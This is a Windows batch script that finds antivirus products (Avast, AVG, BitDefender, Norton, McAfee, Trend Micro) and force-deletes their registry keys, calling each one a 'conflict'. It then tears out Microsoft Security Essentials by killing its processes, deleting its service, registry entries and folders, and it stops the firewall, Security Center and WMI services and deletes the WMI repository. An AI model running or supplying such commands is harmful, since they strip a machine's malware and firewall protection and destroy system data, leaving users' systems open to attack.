:: Code by Daniel Belts
@ECHO OFF

:AVAST
reg query "HKLM\SOFTWARE\AVAST Software"
IF %errorlevel%==0 (
	reg delete "HKLM\Software\AVAST Software" /va /f
	reg delete "HKLM\Software\AVAST Software" /f
	ECHO Avast Conflict Detected
)	else 	(
	Echo Avast Conflict Not Detected
	goto AVG
)

:AVG
reg query "HKLM\SOFTWARE\AVG"
IF %errorlevel%==0 (
	reg delete "HKLM\Software\AVG" /va /f
	reg delete "HKLM\Software\AVG" /f
	ECHO AVG Conflict Detected
)	else 	(
	Echo AVG Conflict Not Detected
	goto BITDEFENDER
)

:BITDEFENDER
reg query "HKLM\SOFTWARE\BitDefender"
IF %errorlevel%==0 (
	reg delete "HKLM\Software\BitDefender" /va /f
	reg delete "HKLM\Software\BitDefender" /f
	ECHO BitDefender Conflict Detected
)	else 	(
	Echo Bitdefender Conflict Not Detected
	goto NORTON
)

:NORTON
reg query "HKLM\SOFTWARE\Norton"
IF %errorlevel%==0 (
	reg delete "HKLM\Software\Norton" /va /f
	reg delete "HKLM\Software\Norton" /f
	ECHO Norton Conflict Detected
)	else 	(
	Echo Norton Not Detected
	goto MCAFEE
)

:MCAFEE
reg query "HKLM\SOFTWARE\McAfee"
IF %errorlevel%==0 (
	reg delete "HKLM\Software\McAfee" /va /f
	reg delete "HKLM\Software\McAfee" /f
	ECHO McAfee Conflict Detected
)	else 	(
	Echo McAfee Conflict Not Detected
	goto TREND_MICRO
)

:TREND_MICRO
reg query "HKLM\SOFTWARE\TrendMicro"
IF %errorlevel%==0 (
	reg delete "HKLM\Software\TrendMicro" /va /f
	reg delete "HKLM\Software\TrendMicro" /f
	ECHO Trend Micro Conflict Detected
)	else 	(
	Echo Trend Micro Conflict Not Detected
	goto MSE
)

:MSE
::This is an entire uninstall script, because screw you Microsoft.
cd /d "%ProgramFiles%\Microsoft Security Client"
	setup.exe /x
	TASKKILL /f /im MsMpEng.exe
	TASKKILL /f /im msseces.exe
	net stop MsMpSvc
	sc delete MsMpSvc
	REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsMpSvc" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft Antimalware" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft Security Client" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware" /f
	REG DELETE "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Current Version\Run\MSC" /f
	REG DELETE "HKEY_CLASSES_ROOT\Installer\Products\4C677A77F01DD614880F352F9DCD9D3B" /f
	REG DELETE "HKEY_CLASSES_ROOT\Installer\Products\4D880477777087D409D44E533B815F2D" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Security Client" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{774088D4-0777-4D78-904D-E435B318F5D2}" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{77A776C4-D10F-416D-88F0-53F2D9DCD9B3}" /f
	REG DELETE "HKEY_CLASSES_ROOT\Installer\UpgradeCodes\1F69ACF0D1CF2B7418F292F0E05EC20B" /f
	REG DELETE "HKEY_CLASSES_ROOT\Installer\UpgradeCodes\11BB99F8B7FD53D4398442FBBAEF050F" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\4C677A77F01DD614880F352F9DCD9D3B" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\4D880477777087D409D44E533B815F2D" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UpgradeCodes\11BB99F8B7FD53D4398442FBBAEF050F" /f
	REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UpgradeCodes\1F69ACF0D1CF2B7418F292F0E05EC20B" /f
	takeown /f "%ProgramData%\Microsoft\Microsoft Antimalware" /a /r
	takeown /f "%ProgramData%\Microsoft\Microsoft Security Client" /a /r
	takeown /f "%ProgramFiles%\Microsoft Security Client" /a /r
	rmdir /s /q "%ProgramData%\Microsoft\Microsoft Antimalware"
	rmdir /s /q "%ProgramData%\Microsoft\Microsoft Security Client"
	rmdir /s /q "%ProgramFiles%\Microsoft Security Client"
	sc stop sharedaccess
	sc stop mpssvc
	sc stop wscsvc
	sc stop iphlpsvc
	sc stop winmgmt
	rmdir /s /q "C:\Windows\System32\wbem\Repository"
	sc stop
goto end

:END
exit